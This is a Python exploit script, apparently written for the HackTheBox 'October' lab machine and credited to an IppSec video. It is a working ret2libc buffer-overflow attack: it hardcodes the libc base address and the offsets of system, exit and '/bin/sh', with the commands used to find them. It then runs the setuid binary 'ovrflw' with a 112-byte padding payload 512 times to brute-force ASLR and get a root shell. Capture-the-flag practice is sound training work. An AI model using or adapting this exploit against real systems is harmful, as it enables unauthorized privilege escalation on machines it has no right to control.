#
#  Privilege Escalation Exploit for hackTheBox October
#
#  From IppSec https://youtu.be/K05mJazHhF4
# 

from subprocess import call
import struct

# libc base address using:
# ldd /usr/local/bin/ovrflw | grep libc

libc_base_addr = 0xb75e0000

# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system

system_off = 0x00040310
exit_off   = 0x00033260

# strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh

binsh_off  = 0x00162bac

binsh_addr  = struct.pack("<I", libc_base_addr + binsh_off)
system_addr = struct.pack("<I", libc_base_addr + system_off)
exit_addr   = struct.pack("<I", libc_base_addr + exit_off)

junk = ('A' * 112)

payload = junk + system_addr +  exit_addr + binsh_addr

i = 0
while (i < 512):
    print("Try: %s" % i)
    i += 1
    ret = call(["/usr/local/bin/ovrflw", payload])
